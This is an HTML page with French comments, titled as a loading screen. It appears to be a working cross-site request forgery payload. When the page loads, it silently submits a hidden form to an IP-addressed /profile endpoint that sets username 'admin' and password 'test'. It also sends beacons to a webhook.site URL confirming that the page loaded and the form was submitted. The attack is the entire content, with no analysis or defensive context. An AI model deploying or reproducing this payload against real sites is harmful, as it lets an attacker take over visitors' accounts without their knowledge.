<!doctype html>
<html lang="fr">
<head>
  <meta charset="utf-8">
  <title>Chargement…</title>
</head>
<body>

  <!-- Permet de soumettre le formulaire sans quitter cette page -->
  <iframe name="result" hidden></iframe>

  <form
    id="csrf"
    action="http://130.117.187.88:35872/profile"
    method="POST"
    target="result"
  >
    <input type="hidden" name="username" value="admin">
    <input type="hidden" name="password" value="test">
  </form>

  <script>
    const webhook =
      "https://webhook.site/82799be4-3e05-4acf-96db-9351edff3642";

    // Indique que la page a été ouverte et que JavaScript fonctionne.
    navigator.sendBeacon(webhook + "?event=page_loaded");

    // Envoie la requête CSRF dans l'iframe.
    document.getElementById("csrf").submit();

    // Indique que submit() a bien été appelé.
    setTimeout(() => {
      navigator.sendBeacon(webhook + "?event=form_submitted");
    }, 1000);
  </script>
</body>
</html>
